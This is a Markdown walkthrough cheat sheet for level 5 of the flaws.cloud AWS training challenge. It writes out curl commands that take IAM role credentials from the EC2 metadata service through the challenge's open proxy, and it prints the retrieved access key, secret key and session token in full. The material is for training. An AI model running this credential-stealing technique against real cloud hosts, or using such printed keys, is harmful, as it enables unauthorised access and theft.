# Flaws.Cloud 1 - Walkthrough Cheat Sheet



## Guide Table of Contents
- [Flaws.Cloud 1 - Walkthrough Cheat Sheet](#flawscloud-1---walkthrough-cheat-sheet)
  - [Guide Table of Contents](#guide-table-of-contents)
  - [Challenge Prerequisites](#challenge-prerequisites)
  - [Challenge Tools](#challenge-tools)
  - [Guide Table of Contents](#guide-table-of-contents-1)
  - [Commands Used in Challenge](#commands-used-in-challenge)
  - [Important Notes from Challenge](#important-notes-from-challenge)
- [Levels](#levels)
  - [Level 0 -  Level 0 Name](#level-0----level-0-name)
    - [Level 0 Prerequisites](#level-0-prerequisites)
    - [Level 0 Tools](#level-0-tools)
    - [Commands Used in Level 0](#commands-used-in-level-0)
  - [Important Notes from Level 0](#important-notes-from-level-0)
  - [Level 5 -  Level 5 EC2 Metadata 169.254.169.254](#level-5----level-5-ec2-metadata-169254169254)
    - [Level 5 Prerequisites](#level-5-prerequisites)
    - [Level 5 Tools](#level-5-tools)
    - [Commands Used in Level 5](#commands-used-in-level-5)
    - [Important Notes from Level 5](#important-notes-from-level-5)

## Challenge Prerequisites
5. EC2 Metadata 169.254.169.254  
   1. Full Update
      1. `sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y && sudo apt-get autoremove -y && sudo apt-get autoclean -y`
   2. JQ
      1. [jq](https://stedolan.github.io/jq/ "jq JSON Parser")

## Challenge Tools
5. EC2 Metadata 169.254.169.254  
   1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
   2. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")
   3. [`jq`](https://stedolan.github.io/jq/ "jq JSON Parser")
   4. ['ec2 metadata'](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html "EC2 Metadata Service")
   5. ['iam metadata'](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html "IAM Metadata Service")


## Commands Used in Challenge 
| 5.0. :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 5.0. :pager: EC2 Metadata 169.254.169.254                                                 | Exposed IAM Credentials in Metadata                                      |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 5.1. :pager:  `Flaws-Scripts/aws_cli_configure_L4Profile.sh`   | Configure AWS CLI                        |
| 5.2. :pager:  `export L5_EC2_URL=4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud"`   | Set EC2 URL Variable                        |
| 5.3. :pager:  `export L5_EC2_PROXY=http://$L5_EC2_URL/proxy`   | Set Proxy URL                        |
| 5.4. :pager:  `export L5_EC2_METADATA_IP=$L5_EC2_PROXY/$EC2_METADATA_IP`   | Get EC2 Metada Service                        |
| 5.5 :pager:   `export L5_EC2_METADATA_URL=$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_METADATA_URL`   | Get Metada URL                        |
| 5.6 :pager:   `export L5_EC2_IAM_METADATA_URL=$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_METADATA_URL/$EC2_IAM_METADATA_URL`   | Get IAM Metada URL                        |
| 5.7 :pager:   `export L5_METADATA=$(curl -s "$L5_EC2_METADATA_URL")`   | Get IAM Role Name                        |
| 5.8 :pager:   `export L5_USER=$(curl -s "$L5_EC2_IAM_METADATA_URL")`   | Get IAM Role Name                        |
| 5.9 :pager:   `export L5_USER_METADATA=$(curl -s "$L5_EC2_IAM_METADATA_URL/$L5_USER")`   | Get IAM Metadata Credentials                       |
| 5.10. :pager:  `export L5_ACCESS_KEY=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.AccessKeyId)'`   | Get User Access Key                        |
| 5.11. :pager:  `export L5_SECRET_KEY=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.SecretAccessKey')`   | Get User Secret Key                        |
| 5.12. :pager:  `export L5_TOKEN=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.Token')`   | Get User Secret Key                        |
| 5.13. :pager:  `Flaws-Scripts/aws_cli_configure_L5Profile.sh`   | Configure AWS CLI                        |
| 5.14. :pager:  `aws s3 ls --profile $L5_USER --region $AWS_REGION $L6_BUCKET_URL`   | List Bucket Files                        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|

## Important Notes from Challenge
| 5. :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 5.0. :pushpin: EC2 Metadata 169.254.169.254                                                 | Exposed IAM Credentials in Metadata                                      |
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 5.1. :pushpin:  Level 5 URL          | `http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/`                                                                         |
| 5.2. :pushpin:  EC2 Metadata Service IP          | `169.254.169.254/`                                                                         |
| 5.3. :pushpin:  EC2 Instance          | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`                                                                         |
| 5.4. :pushpin:  EC2 Metada URL          | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/`                                                                         |
| 5.5. :pushpin:  EC2 IAM Credentials Metada URL          | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`                                                                         |
| 5.6.1 :pushpin:  EC2 Instance Proxy 1         | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/latest/meta-data/iam/security-credentials/`                                                                         |
| 5.6.2 :pushpin:  EC2 Instance Proxy 2         | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml`                                                                         |
| 5.6.3 :pushpin:  EC2 Instance Proxy 3         | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/`                                                                         |
| 5.7.1. :pushpin:  EC2 IAM USER          | `flaws`                                                                         |
| 5.7.2. :pushpin:  fLaws Access Key          | `ASIA6GG7PSQGZVHCOSFP`                                                                         |
| 5.7.3. :pushpin:  flaws Secret Key          | `wzAV+fRr2b0/1IdWA5fsFE1HZ9vGMaJCQ2nAuRI+`                                                                         |
| 5.7.4. :pushpin:  flaws Session Token          | `IQoJb3JpZ2luX2VjENT//////////wEaCXVzLXdlc3QtMiJHMEUCICysxf8e25Ao5/bX7HA0OElp5/RnrV8zMCrJwuCup0+VAiEAmc1uLD5e9NbT1px9rBJZEZnWVETMbu6Cn3ZinbkJ6qcquwUIvf//////////ARADGgw5NzU0MjYyNjIwMjkiDGIiCNBVyz80c8UvFCqPBToN3XQ1BlpYWcvCHVp9s9FlhdQZSCz2TGpnbH6i9lDNH+CH0iI3+eq6/GCrQFMN2YtFv4c4joUbFbmvbxv3p4UuG1FeO3bunakS3DzqSBEF2vMNWNKiwRvOOMHstHXBkPDuK2ciHAVzAQ3JaUZEskTq7TXe4gb/i+Epkx0T3NFnX805JflQKqA6YIdHHcR71PdKKvmFxAOhFLZhdvyKYrlf76xxGjirHjXJmNiA8p/PU8ZzsOYTV0Y6kxMVHJGqwVvH4Cng+iBtL+WfponpZRMgHcBvLw0a2mMrX20BjmI7ifJAfZ9bjX90FnFvqccnnEhYjycEbty+mRtLFmDPo0KM2mbgcQWxp+s1uwzAZTI8Ft4xY6UpHDmAF/6kAU1TNUJuuOz1NtAyxwPly6+k5GaayFumsRW4VbUucLTfeQGOBUlwJAtcT2DUg5kMT9QxNz+RAFpch0f0UCGie2LOlYtg5CIbnN1IxgYjNDcp9MPqYGvVB/g5VnIxZQNHjYE65Q4ScYxwV7UIgqHcG9ZHdjRxEc/jivLvrbcqidUpoxwv55YWTpkvENLgxpQPgX98n1Kmv1ycXYVkfbTvfnPqoWz9QKIITbF+inM+oVE2IT/7jQXnnU3USLHV1DUjOxMeYZ+1BzgwQB6nZYUtvMnESVa5R0iI7r+gPOIeNcVFL3HgeD6ZuN0ZGHzDO7TvuNo4R9D+5pUQ8F4jjkZA5ynmCGkwplOlPY0EeYjl4wnAOBhjvrX20MbbPwZ6yXevi5RlkpFWr5Yennp0cXCNxUsf7Nu5EAaYFgD+PpaGRrHBkgGg9GfGQlrUE13bKVLmJsAQOuokwf9aMGc6yj9YlB5SVsjratoon+e9It1/jwb33jMwqrraoQY6sQGUxpVr3JxA1UBSG3lCGGI5seaaSLOlnTT4G03cpBaCd2RxxISOlv3LtXs5bsLCzR2+eHUeulhCn9mH/Q/SDm5ysm7ztt4DJVzqZy+2CZ+yH9aXzOHOmHhQisOboLdj9V3NMQ/9P8ZKeWpVyQSTcEaK3kJ9mkbP7NJSWOnnW1S7r0kSyq2p8v0My/6ge4gtxeZTkzws4nRcS3XIlzoqlDxHGnwDzz/op65TdyGre0bPiQ8=`                                                                         |
| 6.1 :pushpin:  Level 6 URL         | `L6_URL=http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/`                                                                         |
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|

# Levels


<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
<!-- ?                                                                              Level 0 - Template                                                                         -->
<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
## Level 0 -  Level 0 Name
<!--*        ------------------------------ -->
### Level 0 Prerequisites
1. Prerequisite 1
   1. Prequisite Reference

### Level 0 Tools
1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
2. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")




### Commands Used in Level 0
| 0. :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 0.0. :pager Title                | Description        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 0.1. :pager:  `Flaws-Scripts/aws_cli_configure_L.sh`   | Configure AWS CLI                        |






## Important Notes from Level 0
| :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 0.1. :pushpin:  Level 0 URL          | ``                                                                         |




<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
<!-- ?                                                                              Level 1 - AWS Un-Authenticated Enumeration                                                                         -->
<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->

## Level 5 -  Level 5 EC2 Metadata 169.254.169.254
<!--*        ------------------------------ -->
### Level 5 Prerequisites
1. Full Update
   1. `sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y && sudo apt-get autoremove -y && sudo apt-get autoclean -y`
2. JQ
   1. [jq](https://stedolan.github.io/jq/ "jq JSON Parser")

### Level 5 Tools
1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
2. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")
3. [`jq`](https://stedolan.github.io/jq/ "jq JSON Parser")
4. ['ec2 metadata'](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html "EC2 Metadata Service")
5. ['iam metadata'](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html "IAM Metadata Service")
6. 



### Commands Used in Level 5
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 5.0. :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 5.0. :pager: EC2 Metadata 169.254.169.254                                                 | Exposed IAM Credentials in Metadata                                      |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 5.1. :pager:  `Flaws-Scripts/aws_cli_configure_L4Profile.sh`   | Configure AWS CLI                        |
| 5.2. :pager:  `export L5_EC2_URL=4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud"`   | Set EC2 URL Variable                        |
| 5.3. :pager:  `export L5_EC2_PROXY=http://$L5_EC2_URL/proxy`   | Set Proxy URL                        |
| 5.4. :pager:  `export L5_EC2_METADATA_IP=$L5_EC2_PROXY/$EC2_METADATA_IP`   | Get EC2 Metada Service                        |
| 5.5 :pager:   `export L5_EC2_METADATA_URL=$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_METADATA_URL`   | Get Metada URL                        |
| 5.6 :pager:   `export L5_EC2_IAM_METADATA_URL=$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_METADATA_URL/$EC2_IAM_METADATA_URL`   | Get IAM Metada URL                        |
| 5.7 :pager:   `export L5_METADATA=$(curl -s "$L5_EC2_METADATA_URL")`   | Get IAM Role Name                        |
| 5.8 :pager:   `export L5_USER=$(curl -s "$L5_EC2_IAM_METADATA_URL")`   | Get IAM Role Name                        |
| 5.9 :pager:   `export L5_USER_METADATA=$(curl -s "$L5_EC2_IAM_METADATA_URL/$L5_USER")`   | Get IAM Metadata Credentials                       |
| 5.10. :pager:  `export L5_ACCESS_KEY=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.AccessKeyId)'`   | Get User Access Key                        |
| 5.11. :pager:  `export L5_SECRET_KEY=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.SecretAccessKey')`   | Get User Secret Key                        |
| 5.12. :pager:  `export L5_TOKEN=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.Token')`   | Get User Secret Key                        |
| 5.13. :pager:  `Flaws-Scripts/aws_cli_configure_L5Profile.sh`   | Configure AWS CLI                        |
| 5.14. :pager:  `aws s3 ls --profile $L5_USER --region $AWS_REGION $L6_BUCKET_URL`   | List Bucket Files                        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|




### Important Notes from Level 5
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 5. :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 5.0. :pushpin: EC2 Metadata 169.254.169.254                                                 | Exposed IAM Credentials in Metadata                                      |
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 5.1. :pushpin:  Level 5 URL          | `http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/`                                                                         |
| 5.2. :pushpin:  EC2 Metadata Service IP          | `169.254.169.254/`                                                                         |
| 5.3. :pushpin:  EC2 Instance          | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`                                                                         |
| 5.4. :pushpin:  EC2 Metada URL          | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/`                                                                         |
| 5.5. :pushpin:  EC2 IAM Credentials Metada URL          | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`                                                                         |
| 5.6.1 :pushpin:  EC2 Instance Proxy 1         | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/latest/meta-data/iam/security-credentials/`                                                                         |
| 5.6.2 :pushpin:  EC2 Instance Proxy 2         | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml`                                                                         |
| 5.6.3 :pushpin:  EC2 Instance Proxy 3         | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/`                                                                         |
| 5.7.1. :pushpin:  EC2 IAM USER          | `flaws`                                                                         |
| 5.7.2. :pushpin:  fLaws Access Key          | `ASIA6GG7PSQGZVHCOSFP`                                                                         |
| 5.7.3. :pushpin:  flaws Secret Key          | `wzAV+fRr2b0/1IdWA5fsFE1HZ9vGMaJCQ2nAuRI+`                                                                         |
| 5.7.4. :pushpin:  flaws Session Token          | `IQoJb3JpZ2luX2VjENT//////////wEaCXVzLXdlc3QtMiJHMEUCICysxf8e25Ao5/bX7HA0OElp5/RnrV8zMCrJwuCup0+VAiEAmc1uLD5e9NbT1px9rBJZEZnWVETMbu6Cn3ZinbkJ6qcquwUIvf//////////ARADGgw5NzU0MjYyNjIwMjkiDGIiCNBVyz80c8UvFCqPBToN3XQ1BlpYWcvCHVp9s9FlhdQZSCz2TGpnbH6i9lDNH+CH0iI3+eq6/GCrQFMN2YtFv4c4joUbFbmvbxv3p4UuG1FeO3bunakS3DzqSBEF2vMNWNKiwRvOOMHstHXBkPDuK2ciHAVzAQ3JaUZEskTq7TXe4gb/i+Epkx0T3NFnX805JflQKqA6YIdHHcR71PdKKvmFxAOhFLZhdvyKYrlf76xxGjirHjXJmNiA8p/PU8ZzsOYTV0Y6kxMVHJGqwVvH4Cng+iBtL+WfponpZRMgHcBvLw0a2mMrX20BjmI7ifJAfZ9bjX90FnFvqccnnEhYjycEbty+mRtLFmDPo0KM2mbgcQWxp+s1uwzAZTI8Ft4xY6UpHDmAF/6kAU1TNUJuuOz1NtAyxwPly6+k5GaayFumsRW4VbUucLTfeQGOBUlwJAtcT2DUg5kMT9QxNz+RAFpch0f0UCGie2LOlYtg5CIbnN1IxgYjNDcp9MPqYGvVB/g5VnIxZQNHjYE65Q4ScYxwV7UIgqHcG9ZHdjRxEc/jivLvrbcqidUpoxwv55YWTpkvENLgxpQPgX98n1Kmv1ycXYVkfbTvfnPqoWz9QKIITbF+inM+oVE2IT/7jQXnnU3USLHV1DUjOxMeYZ+1BzgwQB6nZYUtvMnESVa5R0iI7r+gPOIeNcVFL3HgeD6ZuN0ZGHzDO7TvuNo4R9D+5pUQ8F4jjkZA5ynmCGkwplOlPY0EeYjl4wnAOBhjvrX20MbbPwZ6yXevi5RlkpFWr5Yennp0cXCNxUsf7Nu5EAaYFgD+PpaGRrHBkgGg9GfGQlrUE13bKVLmJsAQOuokwf9aMGc6yj9YlB5SVsjratoon+e9It1/jwb33jMwqrraoQY6sQGUxpVr3JxA1UBSG3lCGGI5seaaSLOlnTT4G03cpBaCd2RxxISOlv3LtXs5bsLCzR2+eHUeulhCn9mH/Q/SDm5ysm7ztt4DJVzqZy+2CZ+yH9aXzOHOmHhQisOboLdj9V3NMQ/9P8ZKeWpVyQSTcEaK3kJ9mkbP7NJSWOnnW1S7r0kSyq2p8v0My/6ge4gtxeZTkzws4nRcS3XIlzoqlDxHGnwDzz/op65TdyGre0bPiQ8=`                                                                         |
| 6.0 :pushpin:  Level 6 URL         | `L6_URL=http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/`                                                                         |




<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
<!-- ?                                                                              Final Level 6 -                                                                          -->
<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
